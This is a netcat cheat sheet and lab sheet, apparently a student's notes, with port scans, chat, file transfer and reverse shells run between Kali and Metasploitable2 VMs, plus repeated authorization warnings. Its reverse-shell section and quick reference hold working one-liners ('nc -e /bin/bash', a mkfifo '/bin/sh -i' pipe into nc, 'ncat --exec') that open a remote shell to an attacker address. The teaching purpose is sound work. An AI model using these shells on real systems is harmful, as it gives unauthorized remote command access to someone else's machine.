 # 🛠️ Netcat (nc) Cheat Sheet

Netcat is a versatile networking tool used for reading/writing data over TCP/UDP. It's often called the "Swiss Army knife" of networking.

---

## 🔧 Basic Syntax

nc [options] [host] [port]

# `nc` (netcat) Quick Reference 🚀

A compact, ready-to-copy reference for common **netcat (`nc`)** use cases, useful flags, compatibility notes, and safe-practice reminders. Save as `nc-cheatsheet.md`.

---

## 🚀 Common Use Cases

### 1. Connect to a Remote Port  
Test if a service is running.
```bash
nc <target_ip> <port>
```

### 2. Listen for Incoming Connections  
Set up a listener (e.g., for reverse shells or chat).
```bash
nc -lvp <port>
```

### 3. Port Scanning  
Scan for open ports.
```bash
nc -zv <target_ip> <start_port>-<end_port>
```

### 4. File Transfer

**Sender:**
```bash
nc -lvp 4444 < file.txt
```

**Receiver:**
```bash
nc <sender_ip> 4444 > file.txt
```

### 5. Simple Chat Between Two VMs

**On one VM:**
```bash
nc -lvp 1234
```

**On the other:**
```bash
nc <target_ip> 1234
```

### 6. Reverse Shell (Lab Use Only)
```bash
nc -e /bin/bash <attacker_ip> <port>
```
> ⚠️ Use only in ethical, controlled environments.
>
> ## 📸 Lab Proof: Screenshots

---

### ⚙️ Pre-Module Setup

**Network Configuration**
![Pre Setup 1](NETCAT%20screenshots/pre-setup-1.png)

**VM Initialization**
![Pre Setup 2](NETCAT%20screenshots/pre-setup-2.png)

**Shared Folder Mount**
![Pre Setup 3](NETCAT%20screenshots/pre-setup-3.png)

---

### 🔍 Module 1: Port Scan

**Scan Execution**
![Port Scan 1](NETCAT%20screenshots/port-scan-1.png)

**Verbose Output**
![Port Scan 2](NETCAT%20screenshots/port-scan-2.png)

---

### 📁 Module 2: File Transfer

**Sender Terminal**
![File Transfer 1](NETCAT%20screenshots/file-transfer-1.png)

**Receiver Confirmation**
![File Transfer 2](NETCAT%20screenshots/file-transfer-2.png)

---

### 💬 Module 3: Chat Simulation

**Message Exchange**
![Chat Simulation](NETCAT%20screenshots/chat-1.png)

---

### 🧠 Module 4: Reverse Shell

**Listener Setup**
![Reverse Shell 1](NETCAT%20screenshots/reverse-shell-1.png)

**Shell Access**
![Reverse Shell 2](NETCAT%20screenshots/reverse-shell-2.png)


---

## ➕ Additional Useful Examples

### UDP Examples
```bash
# UDP connect
nc -u <target_ip> <port>

# UDP listen (verbose)
nc -luv <port>
```

### IPv6
```bash
nc -6 <ipv6_address> <port>
```

### Timeouts, Numeric-only, Close-on-EOF
```bash
nc -w 5 -zv 192.168.1.10 22-80   # -w set timeout (seconds)
nc -n <target_ip> <port>         # skip DNS resolution (numeric only)
nc -N -lvp 4444                  # close on remote EOF (if supported)
```

### Bind Source IP / Source Port
```bash
nc -s <source_ip> -p <source_port> <target_ip> <port>
```

### Secure Alternatives / TLS (when available)
```bash
# ncat (from Nmap) with SSL
ncat --ssl <host> <port>

# OpenSSL client for TLS
openssl s_client -connect <host>:<port>
```

---

## 🧠 Flags to Remember

| Flag  | Description                                              |
|-------|----------------------------------------------------------|
| `-l`  | Listen mode                                              |
| `-v`  | Verbose output                                           |
| `-p`  | Local port                                               |
| `-z`  | Zero-I/O mode (used for port scanning)                   |
| `-e`  | Execute program after connection (if supported)          |
| `-u`  | Use UDP instead of TCP                                   |
| `-n`  | Numeric-only; skip DNS lookups                           |
| `-w`  | Timeout (seconds)                                        |
| `-N`  | Close connection on EOF (if supported)                   |
| `-6`  | Use IPv6                                                 |

---

## ⚠️ Compatibility Notes

- Many modern distributions use **OpenBSD `nc`**, which often **does NOT** support `-e`.  
- `ncat` (from Nmap) may offer `--exec`/`--allow` and built-in SSL support.  
- Windows users may have `ncat` instead of standard GNU/OpenBSD `nc`.  
- Behavior and available flags vary by implementation — check `man nc` or `nc -h` on your system.

---

## 📌 Safety & Legal Reminder

- **Not encrypted** — do **not** transmit sensitive data with plain `nc` over untrusted networks.  
- Use `nc` only on systems and networks you own or are explicitly authorized to test. Unauthorized access or attacks are illegal.  
- Prefer `ncat --ssl` or `openssl s_client` for encrypted sessions when appropriate.

---

## ✅ Quick Example: Port Check + Verbose + Timeout
```bash
nc -zv -w 3 192.168.1.10 22-80
```

---

## ✅ Quick Reference (one-liners)
```bash
# Check TCP service
nc target.example.com 80

# Start listener (TCP)
nc -lvp 4444

# UDP listen
nc -luv 5000

# Port scan
nc -zv 10.0.0.5 1-1024

# File transfer (sender)
nc -lvp 4444 < file.txt

# File transfer (receiver)
nc sender_ip 4444 > file.txt

# TLS using ncat (if available)
ncat --ssl example.com 443
```

---

# 🧪 Netcat Practical Lab Sheet

This sheet walks through hands-on Netcat exercises using Kali Linux and Metasploitable2 on the same VirtualBox network.

---

# Netcat Labs (Kali & Metasploitable2)
> Use **only** in isolated lab environments you own or are authorized to test.  
> Never use these techniques against systems you do not have explicit permission to test.

---

## Overview
This document contains simple Netcat (`nc`) examples used in controlled labs to demonstrate basic connectivity, file transfer, and reverse shells. Replace the example IPs and filenames with values appropriate for your isolated lab setup.

---

## Flags & Quick Notes
- `-z`: Scan mode (no data sent)  
- `-v`: Verbose output  
- `-l`: Listen mode (server)  
- `-p`: Specify local port (listener)  
- `-N`: Shutdown network socket after EOF (useful to close cleanly)  
🔍 **Output:** Shows which ports are open and responding.

---

## Pre-checks (Netcat version & networking)
Always verify the `nc` implementation and that lab networking allows the traffic.

```bash
# Common checks
nc -h            # show help (output varies by implementation)
nc --version     # works on some builds; if not, check package manager
which nc
# On Debian/Ubuntu you might have: netcat-openbsd or netcat-traditional
dpkg -l | grep netcat
```

Confirm VM networking (example for VirtualBox internal network):
- Ensure both VMs are on same host-only or internal network.
- Verify IPs with `ip a` or `ifconfig`.

---

## Lab 1: Port Scan (Basic)
**Purpose:** Quickly check for open ports on a target host.

```bash
# Example: scan ports 1-1000 on target
TARGET_IP="192.168.56.102"
nc -z -v $TARGET_IP 1-1000
```

🔍 **Output:** Shows which ports are open and responding.


---

## Lab 2: Chat Between Kali and Metasploitable2
**Purpose:** Confirm basic TCP connectivity by exchanging plain text messages.

**On Metasploitable2 (listener/receiver):**
```bash
# Replace LISTEN_PORT and optionally use -p
nc -lvp 4444
```

**On Kali (client/sender):**
```bash
nc 192.168.56.102 4444
```

🔍 **Result:** Type messages back and forth — confirms connectivity.


---

## Lab 3: Transfer a File
**Purpose:** Send a file over TCP and verify integrity.

**On Receiver (Metasploitable2):**
```bash
nc -lvp 5555 > received.txt
```

**On Sender (Kali):**
```bash
nc 192.168.56.102 5555 < file.txt
```

**Verify integrity (on receiver):**
```bash
# On Sender before transfer
sha256sum file.txt

# On Receiver after transfer
sha256sum received.txt
# Compare the hashes — they should match
```

🔍 **Result:** `received.txt` should match `file.txt`.



---

## Lab 4: Reverse Shell (Ethical Use Only)
**Important:** Only run this in isolated, legal lab environments (e.g., intentionally vulnerable VMs you control). Reverse shells provide remote command access and are high-risk if used improperly.

**Simple Netcat reverse shell (if `-e` is supported):**

**On Kali (Listener):**
```bash
nc -lvp 4444
```

**On Metasploitable2 (Sender / target):**
```bash
nc 192.168.56.101 4444 -e /bin/bash
```

**If `-e` is NOT supported (common with netcat-openbsd), use a `mkfifo` workaround:**
```bash
# On the target (Metasploitable2)
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.56.101 4444 > /tmp/f
```

**Alternative with ncat (Nmap's ncat) which supports `--exec`:**
```bash
# On target with ncat available:
ncat 192.168.56.101 4444 --exec "/bin/bash" --keep-open
```

🔍 **Result:** Kali gets shell access to Metasploitable2 (in lab only).

## 📸 Lab Proof: Screenshots

---

## 📸 Lab Proof: Screenshots

## 📸 Lab Proof

All screenshots captured during the Netcat lab modules are available in the [`NETCAT screenshots`](NETCAT%20screenshots/) folder.  
This includes setup steps, port scans, file transfers, chat simulation, and reverse shell execution.

Use this folder to visually verify each stage of the practical work.



---

## Journal / Logging Template
Keep a short journal for each lab run to document what you did and why.

```
Date: 2025-10-14
Lab: Lab 1 / Lab 2 / Lab 3 / Lab 4
Target IP: 192.168.56.102
Listener IP: 192.168.56.103
Ports used: 4444, 5555, ...
Commands executed:
- nc -z -v 192.168.56.102 1-1000
- nc -lvp 4444
- nc 192.168.56.102 4444
Notes / Observations:
- Netcat version: netcat-openbsd 1.10
- -e unsupported; used mkfifo workaround
Hashes:
- SHA256(file.txt) = <paste-hash-here>
```

---

## Safety / Ethics
- Obtain **explicit permission** before interacting with any systems you do not own.  
- Use isolated lab environments (VirtualBox/VMware with internal networks, intentionally vulnerable VMs like Metasploitable).  
- Document actions and keep backups of any valuable data.  
- Some Netcat builds **do not** support `-e`; behavior varies. When in doubt, test `nc -h` or use `mkfifo` or `ncat`.

---

## Troubleshooting & Notes
- If `nc` reports `address already in use` — check for other listeners on that port: `ss -ltnp | grep 4444`.  
- If file transfer appears corrupted, verify file sizes and `sha256sum`.  
- If listener doesn't receive anything, confirm firewall rules, VM network mode, and host-only adapter settings.  
- Use `tcpdump -i <iface> port 4444` or Wireshark to inspect traffic in the lab.  
- To close a listening `nc` session gracefully, try `Ctrl+C` on the listener or use `-N` on the client side where available.

---

## Quick Reference / Cheatsheet
```bash
# Port scan
nc -z -v TARGET 1-1000

# Start listener (verbose)
nc -lvp 4444

# Connect to listener
nc TARGET_IP 4444

# Send file (sender)
nc TARGET_IP 5555 < file.txt

# Receive file (listener)
nc -lvp 5555 > received.txt

# Reverse shell (if -e supported)
nc ATTACKER_IP 4444 -e /bin/bash

# Reverse shell workaround (mkfifo)
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

---

## End notes
- Replace placeholder IPs, ports, and filenames before running.  
- Keep this document in your lab notes and update with observed behavior for your environment.



### 📸 Screenshots for each lab are stored in `/NETCAT screenshots/` with matching filenames.

# Netcat Lab Progress

| Lab | Status | Screenshot | Notes |
|-----|--------|------------|-------|
| Port Scan | ✅ Done | ✅ | Basic TCP scan |
| Chat | ✅ Done | ✅ | Bi-directional |
| File Transfer | ✅ Done | ✅ | Hash verified |
| Reverse Shell | ⚠️ In Progress | ❌ | Testing mkfifo |



